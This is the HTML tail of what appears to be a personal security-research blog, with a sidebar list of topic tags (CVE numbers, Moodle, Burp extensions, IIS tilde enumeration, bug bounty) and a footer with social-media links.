    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2023-46456" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2023-46456</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2024-35538" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2024-35538</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2024-35539" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2024-35539</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2024-35540" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2024-35540</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/badmoodle" data-toggle="tooltip" data-placement="right" title="1">
        <span>badmoodle</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/bug-bounty" data-toggle="tooltip" data-placement="right" title="1">
        <span>bug-bounty</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/burp-extension" data-toggle="tooltip" data-placement="right" title="2">
        <span>burp-extension</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/conference" data-toggle="tooltip" data-placement="right" title="1">
        <span>conference</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/cve-advisories" data-toggle="tooltip" data-placement="right" title="4">
        <span>cve-advisories</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/hackinbo" data-toggle="tooltip" data-placement="right" title="1">
        <span>hackinbo</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/iis-tilde-enumeration" data-toggle="tooltip" data-placement="right" title="2">
        <span>iis-tilde-enumeration</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/moodle" data-toggle="tooltip" data-placement="right" title="1">
        <span>moodle</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/portswigger" data-toggle="tooltip" data-placement="right" title="1">
        <span>portswigger</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/tools" data-toggle="tooltip" data-placement="right" title="3">
        <span>tools</span></a></li>
    
  </ul>
</div>

            </div>
          </div>
        </div>
        

      </div>
          <footer class="footer-distributed">
      <div class="container">
        <div class="footer">
          <p>cyberaz0r &copy; 2024</p>
          <h6>Follow me</h6>

<ul class="social-media">

  
    <li>
      <a title="cyberaz0r on Github" href="https://github.com/cyberaz0r" target="_blank"><i class="fab fa-github fa-2x"></i></a>
    </li>
  

  

  
    <li>
      <a title="cyberaz0r on LinkedIn" href="https://www.linkedin.com/in/cyberaz0r" target="_blank"><i class="fab fa-linkedin fa-2x"></i></a>
    </li>
  

  

  

  
    <li>
      <a title="feed.xml RSS" href="/feed.xml" target="_blank"><i class="fas fa-rss fa-2x"></i></a>
    </li>
  

</ul>

          <h6>Powered by <a href="https://pages.github.com">GitHub Pages</a>, <a href="https://jekyllrb.com">Jekyll</a> and <a href="https://github.com/streetturtle/jekyll-clean-dark">Jekyll Clean Dark Theme</a></h6>
        </div>
      </div>
    </footer>

    </div>
  </body>
</html>
